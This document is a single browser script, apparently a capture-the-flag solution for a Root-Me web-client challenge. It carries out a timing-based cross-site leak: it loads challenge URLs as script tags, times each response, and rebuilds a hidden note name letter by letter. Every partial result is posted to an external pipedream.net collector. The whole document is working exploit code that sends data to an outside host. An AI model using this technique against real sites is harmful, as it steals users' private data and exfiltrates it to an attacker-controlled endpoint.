<script>
function sendRequest(url) {
    let xhr = new XMLHttpRequest();
    xhr.open("POST", "https://eocvkn4m3kpce3q.m.pipedream.net");
    xhr.send(url);
}

function getKeyOfGreatestElement(dictionary) {
    let maxKey = null;
    let maxValue = -Infinity;
  
    for (const key in dictionary) {
      if (dictionary.hasOwnProperty(key)) {
        const value = dictionary[key];
        if (value > maxValue) {
          maxValue = value;
          maxKey = key;
        }
      }
    }
  
    return maxKey;
  }
    
async function attack() {
    sendRequest("test=true")
    let noteName = "";
    let lowercase_letters = "azertyuiopmlkjhgfdsqwxcvbn"; //the flag is supposed to be composed of only lowercase letters
    //suposing the flag is 32 characters long
    let i = 0;
    while (i < 10001 && noteName.length < 32) {
        let times = {};
        let j = 0;
        while (j < lowercase_letters.length) {
            const l = lowercase_letters[j];
            if (i % 1000 == 0) {
                sendRequest("id="+i);
            }
            try {
                await new Promise((resolve, reject) => {
                    //fetch page
                    var script = document.createElement('script');
                    script.src = `https://web-client-ch56.challenge01.root-me.org:58056/notes/${i}/${noteName + l}`;
                    document.body.appendChild(script);
                    // Start the clock
                    var start = performance.now();
                    
                    // When script loads, caculate the time it took to finish the request
                    script.onload = () => {
                        var time = performance.now() - start;
                        times[l] = time;
                        resolve();
                    }
                    script.onerror = reject;
                })
                
            } catch (error) {
                i+=1;
                j=0;
                continue;
            }
            j++;
        }
        noteName += getKeyOfGreatestElement(times);
        //partially send the name to keep progress of the attack
        sendRequest(`note_name=${noteName}`);
    }      
    sendRequest("result=false");
}
attack();

</script>
